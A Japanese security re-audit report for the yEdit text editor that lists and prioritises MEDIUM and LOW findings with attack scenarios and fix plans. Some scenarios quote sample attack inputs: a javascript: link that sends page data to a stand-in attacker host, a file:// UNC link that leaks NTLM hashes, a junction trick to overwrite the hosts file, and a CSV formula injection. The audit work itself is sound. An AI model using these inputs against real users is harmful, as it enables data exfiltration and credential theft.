# セキュリティ強化(MEDIUM / LOW 再監査結果) — 2026-07-19

## 背景

SECURITY.md が挙げる 4 攻撃面(Markdown プレビュー / CSV・テキスト読込 / バックアップ復元 / UIA プロバイダ)について、HIGH 6 件を PR #2〜#6 で修正済み(`v0.2.0-sec` 予定)。

HIGH 対応時に「MEDIUM 8 件 / LOW 11 件は次リリース以降」と設計書([2026-07-19-security-hardening-high-design.md](./2026-07-19-security-hardening-high-design.md))で明示的にスコープ外にしていた。その MEDIUM/LOW リストは監査時にディスクへ永続化されていなかったため、**現状のコードベース(PR #6 マージ後)を対象に再監査**を実施したもの。

## 監査方式

- 4 攻撃面別に並列エージェントで再監査(2026-07-19 実施)
- HIGH 6 件の対応済み項目は再列挙しない
- 各所見は「Location / 攻撃シナリオ / なぜ HIGH ではないか / Fix sketch」を必須
- Read-only 監査、コードには一切手を入れていない

## 結果総括

| 系統 | MEDIUM | LOW | 合計 |
|---|---:|---:|---:|
| バックアップ復元 | 3 | 8 | 11 |
| CSV / テキスト読込 | 5 | 11 | 16 |
| Markdown プレビュー | 5 (+1 境界) | 6 | 12 |
| UIA プロバイダ | 4 | 6 | 10 |
| **合計** | **17 (+1)** | **31** | **49** |

初期監査時の予告(MEDIUM 8 / LOW 11 = 19 件)よりも多い。増加分は主に:

- HIGH-6 の PR-5 実装で「Load かつ UNC のみ」に絞ったスコープの残穴(mapped drive / Save 側)
- 症状の近い個別項目の積み上げ
- 新観点(NTFS reparse point / CSP レイヤ深度 / UIA rate limit)

## MEDIUM 17 件(+境界 1 件) — 優先度別

### P0(次リリース強く推奨・攻撃面が広い or 修正が軽い・6 件)

#### BK-M-1: `OriginalPathValidator` の symlink / junction バイパス

- **Location**: `src/yEdit.Core/Backup/OriginalPathValidator.cs:37-79`(consumed at `src/yEdit.App/FileController.cs:411-471`)
- **攻撃シナリオ**: ローカルユーザ権限で作成可能な **directory junction**(symlink は Developer Mode が必要だが junction は無権限)を利用。攻撃者が `%USERPROFILE%\Documents\innocent\ → C:\Windows\System32\drivers\etc\` の junction と、`OriginalPath = %USERPROFILE%\Documents\innocent\hosts` を持つ細工 `BackupRecord` JSON を `%APPDATA%\yEdit\backups\` に配置する。`Path.GetFullPath` はシンタックスのみ正規化し reparse point を解決しないため、`BlockedRoots.StartsWith` はユーザーホーム配下の見た目のパスで `Ok` 判定 → 復元 + Ctrl+S で junction を通り `hosts` を上書き。
- **Why not HIGH**: junction 作成と `%APPDATA%` 書込の両方が必要。攻撃者はすでに顕著なローカル基盤を持っているが、HIGH-2 の白リストを明示的に迂回する LPE / 永続化プリミティブ(hosts / StartUp / `%ProgramData%` 配下の service DLL 検索パス等)になる。
- **Fix sketch**: `OriginalPathValidator.Check` で `Path.GetFullPath` 後に各親ディレクトリを走査し `FileAttributes.ReparsePoint` を検出。代替として `File.ResolveLinkTarget(path, returnFinalTarget: true)` で解決先を取得し `BlockedRoots` を再チェック。

#### CSV-M-1: マップドドライブ(X:)は UNC プローブの対象外 → 60 秒 UI 凍結

- **Location**: `src/yEdit.Core/IO/UncPathDetector.cs:10-15`, `src/yEdit.App/FileController.cs:153-160`
- **攻撃シナリオ**: ユーザが `X:` → `\\dead-server\share` をマップ済みで、`UncPathDetector.IsUnc("X:\\foo.txt")` が `false`(先頭 `\\` のみ検査)を返すためリーチャビリティプローブがスキップされる。`TextFileService.LoadAsBufferAuto` → `File.OpenRead` が SMB リトライで 30〜60 秒ブロック。Recent Files / Explorer ダブルクリック / grep ジャンプで容易に到達。
- **Why not HIGH**: 到達不能サーバへの事前マッピングが必要。HIGH-6 設計書で明示的にスコープ外・MEDIUM 送りと宣言。
- **Fix sketch**: プローブ対象を「正規化ルートが `DriveInfo.DriveType == Network` である全パス」に拡張。無条件に 5 秒プローブへ流す代替案でも可。

#### CSV-M-2: `Save()` 側にリーチャビリティチェックが無い

- **Location**: `src/yEdit.App/FileController.cs:336-387`, `src/yEdit.Core/Text/TextFileService.cs:361-451`, `src/yEdit.Core/IO/AtomicFile.cs:59-93`
- **攻撃シナリオ**: リモート共有が到達可能な状態でファイルを開き、その後にサーバがダウン → Ctrl+S。`WriteToPath → AtomicFile.Write(Stream)` の `FileStream(FileMode.CreateNew)` が SMB リトライで数十秒ブロック(HIGH-6 が塞ぎたかった 60 秒 UI 凍結の再来)。
- **Why not HIGH**: 既にリモート文書を開いていることが前提。データ喪失は起きない(atomic write が原本を保存)。
- **Fix sketch**: `WriteToPath` 冒頭に `IReachabilityProbe.ProbeWithTimeout(path, 5s)` を挿入し、失敗時は既存のエラープロンプトへ短絡。

#### CSV-M-5: CsvParser の総メモリ未拘束 → `OutOfMemoryException` が `LoadInto` catch を素通り

- **Location**: `src/yEdit.Core/Csv/CsvParser.cs:15-18, 57-178`
- **攻撃シナリオ**: HIGH-4 で追加された上限は `MaxFieldChars=8M` / `MaxTotalCells=10M` / `MaxTotalRows=1M` の 3 次元別。`Σ field.Length` は未拘束。10M セル × 各 100KB のような組合せは全次元別上限内で成立するが、.NET string allocator が先に `OutOfMemoryException` を発生。この例外は `DocumentTooLargeException` ではないため `FileController.LoadInto:202-208` の catch が反応せず**プロセスクラッシュ**(HIGH-3 が塞ぎたかった失敗モードの再来)。
- **Why not HIGH**: 実際に到達するかは .NET GC ヒープの空き次第。ただし成立すると HIGH-3 の防御を素通りする。
- **Fix sketch**: 4 番目のガード `long totalChars` を追加(例: `256M chars ≒ 512MB UTF-16`)。`EndField` で `totalChars += sb.Length`、超過なら `DocumentTooLargeException` を throw。約 5 行の追加で完結。

#### MD-M-1: `NavigationStarting` ハンドラ未登録 → 外部リンクが in-frame ナビゲート

- **Location**: `src/yEdit.App/MarkdownPreviewForm.cs:66-107`(該当なし = 登録漏れ)
- **攻撃シナリオ**: 悪意ある `.md` の `[Docs](https://attacker.example/phish)` をクリックで WebView2 が in-frame ナビゲート。CSP は `<meta>` 経由なのでナビゲーション後は失われる。プレビューフォームのタイトル「プレビュー: <filename> - yEdit」のまま偽サイトが表示され、資格情報プロンプト UI で騙せる。
- **Why not HIGH**: ユーザーのクリックが必要。設計書で MEDIUM 認定済。
- **Fix sketch**: `core.NavigationStarting` を登録。`https://yedit.preview/` 以外を `e.Cancel = true` にして `Process.Start(new ProcessStartInfo { UseShellExecute = true })` で既定ブラウザに逃がす。`NewWindowRequested` も同様に処理して `target=_blank` を抑止。初回の `NavigateToString` は `about:blank` オリジンなのでその 1 回だけ許可。

#### MD-M-5: `file://` / UNC リンクで NTLM ハッシュ漏出

- **Location**: `src/yEdit.Core/Text/MarkdownRenderer.cs:15-18`(Markdig scheme sanitization 無し)
- **攻撃シナリオ**: `[Docs](file://\\attacker.example\share\beacon.txt)` を含む `.md`。WebView2 は既定で `file://` ナビゲートを許可し、Windows が UNC を解決して `attacker.example` に NTLM 認証 → NTLMv2 challenge/response をオフラインクラック用に漏洩。`[link](file:///%25USERPROFILE%25/secret.txt)` 相当のローカル参照ではローカルファイルがモーダル内表示。
- **Why not HIGH**: クリックが必要。MD-M-1 と修正が重なる。
- **Fix sketch**: MD-M-1 の whitelist に統合。`file://` を全体的に Cancel リストへ追加。

### P1(次々リリース候補・修正は中規模・7 件)

#### MD-M-2: 単層 CSP + `img-src ... data:`

- **Location**: `src/yEdit.Core/Text/MarkdownRenderer.cs:35`(HTML テンプレート内)
- **攻撃シナリオ**: (a) `<meta http-equiv="Content-Security-Policy">` は該当 `<meta>` 要素のパース後にのみ有効。それ以前に `<head>` で発見されるリソースは無防備。(b) `img-src ... data:` により任意サイズの `data:` URI 画像(`![x](data:image/png;base64, ...大量... )`)が許容 → メモリ膨張 / rendering DoS。(c) 現状のディレクティブ集合は `base-uri` / `form-action` / `frame-ancestors` / `object-src` / `worker-src` / `manifest-src` / `connect-src` を明示していない(現状は `default-src 'none'` で回収されているが、将来ディレクティブ追加時に regression fragility)。(d) MD-M-1 のナビゲーション後は CSP 自体が失われる。
- **Why not HIGH**: raw HTML sink は `.DisableHtml()` で既に塞がれている。SVG-in-img は script 実行しない。既知 CVE なし。
- **Fix sketch**: `CoreWebView2.AddWebResourceRequestedFilter` + `WebResourceRequested` で CSP を HTTP ヘッダとして配信。`data:` を `img-src` から除去(画像は仮想ホスト経由へ)。`base-uri 'none'; form-action 'none'; frame-ancestors 'none'; object-src 'none'; connect-src 'none'` を明示追加。

#### MD-M-3: Markdig が `javascript:` / `vbscript:` scheme を無害化しない

- **Location**: `src/yEdit.Core/Text/MarkdownRenderer.cs:15-18`
- **攻撃シナリオ**: `[click](javascript:fetch('//attacker/'+document.title))`。Markdig 既定は raw scheme をそのまま `href` に出力(`.DisableHtml()` は raw HTML タグにのみ影響、URI 無関係)。現状は CSP `default-src 'none'`(暗黙的に `script-src 'none'`)で実行阻止されているが、MD-M-2 で CSP を弱めた瞬間に live XSS 化。
- **Why not HIGH**: 現状 CSP に単層依存。クリックも必要。
- **Fix sketch**: カスタム `LinkInlineRenderer` で `href` scheme を `{http, https, mailto, #, /, empty}` に限定し、それ以外は `href` 属性を drop。既存の `Render_EscapesRawScriptTag` テストに並行して回帰テスト追加。

#### MD-M-4: WebView2 `UserDataFolder` がグローバル共有

- **Location**: `src/yEdit.App/MarkdownPreviewForm.cs:55-60`
- **攻撃シナリオ**: (a) MD-M-1 でナビが起きた場合の Cookie / IndexedDB / Cache / Service Worker が全プレビュー・全 yEdit プロセスで永続共有。Service Worker が登録されれば以降の fetch を intercept 可能。(b) 並列 yEdit プロセスが同一プロファイルロックを取り合い、2 番目の `EnsureCoreWebView2Async` が例外 → 現状の catch は「WebView2 未インストール」と誤メッセージ。
- **Why not HIGH**: 永続状態は他所見(MD-M-1)が着地して初めて悪化。ロック競合は UX バグで攻撃ではない。
- **Fix sketch**: プレビューごとに `MarkdownPreviewForm` に一時 `CoreWebView2Profile` を作成し `Dispose` で `ClearBrowsingDataAsync(CoreWebView2BrowsingDataKinds.AllProfile)` を呼ぶ。代替として `UserDataFolder` に per-form 一時フォルダを指定。

#### BK-M-2: 複数インスタンスで「すべて破棄」が他インスタンスのライブバックアップを削除

- **Location**: `src/yEdit.App/BackupCoordinator.cs:203-205`, `src/yEdit.App/SerialBackupWriter.cs:56-66`, `src/yEdit.Core/Backup/BackupStore.cs:58-65`
- **攻撃シナリオ**: 単一インスタンス Mutex が存在しない(検証: `grep Mutex` on App が空)。インスタンス A が 5 つの未保存文書を編集中(5 つのライブ `<guid>.json` が `%APPDATA%\yEdit\backups\`)。インスタンス B が起動し復元ダイアログでそれらを見て「すべて破棄」をクリック → `DeleteAll` が `*.json` を全消去。A の `_map` は `HasBackup=true` / `LastSig==sig` のまま `BackupPlanner.Decide` が `None` を返し続けるので次の編集まで再作成されない。この間に A がクラッシュすると未保存作業喪失。
- **Why not HIGH**: ユーザ誤操作(2 インスタンス + 誤クリック)が必要。攻撃者経路無し・純 friendly-fire DoS。
- **Fix sketch**: `DeleteAll` と起動時復元を「このインスタンスが起動時に読み込んだ Id 集合」に限定するか、バックアップ dir を session guid サブディレクトリにスコープ。最小パッチはインスタンス起動時刻より新しい mtime のファイルをスキップ。

#### BK-M-3: バックアップ書込にサイズ上限が無い → ディスク枯渇

- **Location**: `src/yEdit.App/BackupCoordinator.cs:246-247, 292-296`(`SnapshotText` を無条件書込)、`src/yEdit.Core/Backup/BackupStore.cs:22-29`(サイズガード無し)
- **攻撃シナリオ**: 1 GB CSV/text を編集 → 署名が変わる tick ごとに 1〜2 GB の `<guid>.json` が `%APPDATA%` へ書かれる。HIGH-3/HIGH-4 はロード段の cap で、シリアライズ後のバックアップは未拘束。`SnapshotText` の 2 GB 弱の string 割当が UI スレッドで発生。
- **Why not HIGH**: ユーザ自身が巨大ファイルを開く必要がある(攻撃者経路無し)。ディスク圧迫のみでコード実行/データ破壊なし。
- **Fix sketch**: `BackupCoordinator.Reconcile` で `doc.Editor.CurrentBuffer.Length > MaxBackupChars`(例 32 MB)なら書込スキップ + trace warn。代替として `Content` を null にして「path のみ」に縮退。

#### UIA-M-4: `UiaAnnouncer` の rate limit なし DoS

- **Location**: `src/yEdit.App/Speech/UiaAnnouncer.cs:17-41`
- **攻撃シナリオ**: 大量 grep ヒットや悪意ある CSV の高速セル歩行で `Say` が短時間に数百回呼ばれると `_label.Text` の GDI 描画と `RaiseAutomationNotification(MostRecent)` が UI スレッドで連鎖。`MostRecent` により SR 側は最新のみ残るが Label 更新はキューされ再描画発生。攻撃的 CSV(10K 行 × F2 なしのセル歩き)で SR ユーザの操作性が著しく低下。
- **Why not HIGH**: プロセス継続。SR 発話は最終メッセージに縮退。悪化しても操作重くなる程度。
- **Fix sketch**: 前回発話からの経過時間ガード(50 ms 未満は Label のみ更新して `Raise` スキップ)を追加。または同一メッセージの連続を 1 回に dedupe。

### P2(仕様上不可避・SECURITY.md への文書化で対応・3 件)

#### UIA-M-2: `TextPattern.DocumentRange.GetText(-1)` で全タブ本文が同一ユーザ他プロセスから読める

- **Location**: `src/yEdit.Accessibility/TextProviderImplV2.cs:27,39` + `TextRangeProviderV2.GetText(int)`(`TextRangeProviderV2.cs:102-113`)
- **攻撃シナリオ**: 同一ユーザセッションの低権限プロセス(SR 無関係)が UIA クライアント API 経由で `DocumentRange.GetText(-1)` を呼ぶだけで、開いている全タブの本文を吸える(背景タブも UIA 木にぶら下がる)。マルウェアがアクセシビリティソフトを装い GetText をポーリングすれば機密メモを継続窃取可能。
- **Why not HIGH**: UIA は「アクセシビリティのためにコンテンツを露出する」ことそのものが仕様。Windows のあらゆる編集コントロールが同等の窓を開けている。塞げば SR が全く読めなくなる。
- **Fix sketch**: 本質的な緩和策なし。SECURITY.md に「UIA 経由での本文露出は仕様」を 1 行明記。オプションとして「UIA 応答を無効化する」設定を晴眼ユーザ向けに追加できるが SR ユーザには使えない。

#### UIA-M-3: 復元ダイアログのフルパスが UIA + SR に露出

- **Location**: `src/yEdit.App/RestoreDialog.cs:54-67, 99-100`(`Describe(r)` の `{fileName} — {dir}` が `CheckedListBox` アイテム + `AccessibleDescription`)
- **攻撃シナリオ**: 前回クラッシュ時に開いていたパス(例: `%USERPROFILE%\Documents\人事評価\Q2-評価案.txt`)が復元ダイアログ表示中に UIA 木へ載る。別プロセスの UIA クライアントがリスト項目テキストとして取得可能。SR 発話がスピーカーに乗り周囲や録画へ漏出。
- **Why not HIGH**: 実データ本体ではなくパスのみ。復元 UX はユーザがパスを見て判断する設計で、視覚露出とのトレードオフ。
- **Fix sketch**: 「フルパス / ホーム相対 / basename のみ」を設定で選ばせる。既定はホーム相対(`~\Documents\...`)がバランス良い。`AccessibleDescription` は縮退版のみに揃える。

#### UIA-M-1: SR アナウンスへの攻撃者制御コンテンツ流入(social engineering)

- **Location**: `src/yEdit.App/CsvController.cs:213,223,232,372`, `src/yEdit.Core/Csv/CsvAnnounceFormatter.cs:7`, `src/yEdit.App/Speech/UiaAnnouncer.cs:17-36`
- **攻撃シナリオ**: 攻撃者が細工 CSV を配布 → CSV モードで開きセル移動すると `f.Value` がそのまま SR へ発話される。セル本文「Windows パスワードを再入力してください yEdit セキュリティ更新」→ NVDA/JAWS がそのまま発話 → ユーザは「アプリからの正規メッセージ」と誤認しやすい。長さ制限も改行除去も無い。
- **Why not HIGH**: メモリ破壊やコード実行に至らずソーシャルエンジニアリング限定。CSV セル値が発話される仕様を理解していれば違和感を持てる。
- **Fix sketch**: `CsvAnnounceFormatter.Cell` 内で `value` を長さ丸め(例: 80 文字)+ `\r\n\t` 除去。制御文字を含む場合は「制御文字を含みます」に置換。修正 3 行程度なので P1 格上げも可。

### 境界(1 件)

#### MD-M-6: `AreBrowserAcceleratorKeysEnabled` が既定(true)

- **Location**: `src/yEdit.App/MarkdownPreviewForm.cs:80-82`
- **攻撃シナリオ**: WebView2 内で `Ctrl+S` が「Save As」ダイアログを開いて描画済 HTML を保存(意図しないローカル書込)、`Ctrl+P` で印刷ダイアログ、`Ctrl+O` でファイル選択。攻撃というよりは UX バグ寄り。
- **Why not HIGH**: ユーザ主導。特権昇格なし。
- **Fix sketch**: `core.Settings.AreBrowserAcceleratorKeysEnabled = false;` の 1 行。

## LOW 31 件 — 系統別・対応方針別

### 対応推奨(小さい防御堅牢化・1 PR にまとめられる)

| ID | 概要 | Location |
|---|---|---|
| BK-L-1 | `LineEndingId` enum キャストの範囲外検証欠落 | `App/FileController.cs:454` |
| BK-L-2 | 悪意の `CodePage` 例外が外側 catch で silent 破棄 | `App/FileController.cs:452` |
| BK-L-4 | 復元ダイアログでの Unicode RLO(U+202E)未サニタイズ | `App/RestoreDialog.cs:54-67` |
| BK-L-7 | `BackupStore.Write/Delete` が Id 未検証(HIGH-1 対称性) | `Core/Backup/BackupStore.cs:24-55` |
| CSV-L-1 | CsvWriter の formula injection(`=cmd\|...`)未対処 | `Core/Csv/CsvWriter.cs:8-16` |
| CSV-L-5 | パスをプロンプトに出す際の制御文字/RLO 未除去 | `App/FileController.cs:158, 191-197, 431` |
| UIA-L-2 | UIA イベント発火の全 catch swallow → 診断不能 | `Editor/UiaTextHostAdapter.cs:216-233`, `App/Speech/UiaAnnouncer.cs:38-40` |

### 見送り(仕様上不可避・SECURITY.md に文書化)

- **BK-L-3**: バックアップが `%APPDATA%` に平文保存 — テキストエディタとして over-engineering(DPAPI 導入は選択肢だが標準運用に見合わない)
- **UIA-L-5**: WebView2 の Chromium 由来 UIA プロバイダがプレビュー DOM を露出 — Edge/Chrome と同等仕様、WebView2 側で抑止できない
- **UIA-L-6**: `TextChangedEvent` 購読による UIA 経由 keylogger 粒度 — IME 未確定は既に隠蔽済み(良設計)、Commit 単位が上限
- **CSV-L-2**: LineEnding 検出 4KB 窓による「気付かないうちに EOL 統一される」 — Windows テキストエディタとして意図的挙動

### 様子見 / 将来検討

| ID | 概要 | 判断 |
|---|---|---|
| CSV-L-3 | `AtomicFile` の tmp 残骸(電源断時) | 起動時 sweep で対応可(優先度低) |
| CSV-L-4 | `RecentFilesList` の deserialize 時上限未適用 | 1 行で塞げるが実害小 |
| CSV-L-6 | UTF-16/32 BOM が Shift_JIS フォールバックへ落ちる UX 混乱 | 対応するなら BOM 検出強化 |
| CSV-L-7 | `File.Replace` の symlink follow | BK-M-1 と横断的に対応可 |
| CSV-L-8 | `PathKey` 例外時に生小文字返却 | エッジケースのエッジケース |
| CSV-L-9 | UtfUnknown detector のタイムアウト無し | 64KB prefix で入力上限あり |
| CSV-L-10 | `MaxTotalBytes = int.MaxValue` の UTF-8→UTF-16 膨張過小評価 | 512 MB 程度への引下げ検討 |
| CSV-L-11 | CSV F2 commit の perf | パフォーマンス優先度低 |
| BK-L-5 | `Trace.TraceWarning` の CRLF injection | 現時点で攻撃経路なし |
| BK-L-6 | `BackupStore.LoadAll` の per-file catch 沈黙 | 将来 sink 経由化 |
| BK-L-8 | BackupIdValidator が mixed case を許容 | `id == id.ToLowerInvariant()` 追加 |
| MD-L-1 | `style-src 'unsafe-inline'` + Markdig `GenericAttributes` | 悪用範囲はレイアウト defacement のみ |
| MD-L-2 | Markdig `1.3.2` バージョン確認 | canonical は 0.x 系列 — 供給チェーン念のため実行時確認要 |
| MD-L-3 | レンダースレッド DoS(深いネスト・巨大テーブル) | 4 MB 上限で塞げる |
| MD-L-4 | `Render(md, baseHref)` の caller-supplied `baseHref` 信頼 | 単一 caller のため防御的 |
| MD-L-5 | `ShowMarkdownPreview` が拡張子を問わない | 攻撃面拡張の間接要因 |
| MD-L-6 | `NavigateToString` が `about:blank` オリジンとなる仕様 | 参考情報 |
| UIA-L-1 | `FindText` が全範囲を単一 string 展開(1 GB 文書で OOM) | チャンク検索へ差替 |
| UIA-L-3 | `GetRuntimeId` 固定値 `{AppendRuntimeId, 1}` | hwnd で通常一意化される |
| UIA-L-4 | `GrepResultsWindow` 200 文字プレビューが UIA 経路露出 | 「機密検索モード」の設定追加が現実解 |

## 横断的パターン(修正時の観点)

### 1. NTFS reparse point 未考慮

- **該当**: BK-M-1(OriginalPathValidator)、CSV-L-7(AtomicFile.Replace)
- **共通根因**: `Path.GetFullPath` はシンタックスのみで reparse を解決しない
- **推奨**: `OriginalPathValidator` の強化と `AtomicFile.Write` の symlink follow 抑止をセットで実装

### 2. `IReachabilityProbe` 経路の穴

- **該当**: CSV-M-1(mapped drive)、CSV-M-2(Save 側)、CSV-M-3(TOCTOU)
- **共通根因**: HIGH-6 の PR-5 実装が「Load かつ UNC のみ」に絞られた
- **推奨**: 1 PR で「`ProbeWithTimeout` の対象を Network drive へ拡張」+「`WriteToPath` にも挿入」で完結

### 3. 例外の silent catch アンチパターン

- **該当**: BK-L-2(CodePage 例外)、BK-L-6(LoadAll)、UIA-L-2(UIA 発火)
- **推奨**: `_trace` sink 経由での可観測化で統一

### 4. Unicode 制御文字の未サニタイズ

- **該当**: BK-L-4(RestoreDialog)、BK-L-5(trace)、CSV-L-5(prompt)、UIA-M-1(announce)
- **推奨**: 共通の `SanitizeForDisplay` ヘルパを Core に置いて再利用

### 5. CSP + WebView2 複合防御不足

- **該当**: MD-M-1〜M-6 の全て
- **推奨**: 「WebView2 分離プロファイル + NavigationStarting whitelist + CSP をヘッダ配信 + Markdig link scheme filter」の 4 点を 1 PR にまとめると相互補強

## 次リリース(v0.3.0-sec 想定)推奨スコープ

P0 6 件を中心に、以下 3 PR に分割するのが自然(HIGH 対応時の 5 PR 分割と同じ粒度):

| PR 案 | 対象 | 修正規模 |
|---|---|---|
| **PR-A**: バックアップ系 + パスサニタイズ | BK-M-1 + BK-L-1/2/4/7 + 横断的パターン④ の一部 | 中(~150 行) |
| **PR-B**: リーチャビリティプローブ拡張 | CSV-M-1 + CSV-M-2(+可能なら M-3 TOCTOU) | 小(~80 行) |
| **PR-C**: CSV OOM 4 次元目 + Markdown WebView2 総合強化 | CSV-M-5 + MD-M-1/M-3/M-5/M-6(+可能なら M-2/M-4) | 中(~200 行) |

- P1 の残(MD-M-2/M-4、BK-M-2/M-3、UIA-M-4)は PR-A/C に相乗り可能な項目を除き v0.4 系で対応
- P2 / LOW の大半は SECURITY.md への追記(UIA / Markdown / backup の設計限界)で対応するのが実務的

## 実施しない事項(明示的除外)

- 本ドキュメント作成に伴うコード変更(監査は read-only)
- MD-L-2 の実行時検証(`dotnet list package --include-transitive`)— 実装 PR で確認
- CVE 割当(個人プロジェクトのため任意)

## 参照

- [SECURITY.md](../../SECURITY.md) — 対象攻撃面の定義
- [2026-07-19-security-hardening-high-design.md](./2026-07-19-security-hardening-high-design.md) — HIGH 6 件の設計書(本再監査の起点)
- [2026-07-19-security-hardening-high.md](./2026-07-19-security-hardening-high.md) — HIGH 6 件の実装計画
- PR #1〜#6(2026-07-19 マージ)— HIGH 6 件の実装

## メモリ更新方針

本 PR マージ時に:

- `memory/security-hardening-medium-low-audit.md` を新規作成(本再監査の要点・PR 番号・優先度別サマリ)
- `MEMORY.md` の index に 1 行追加
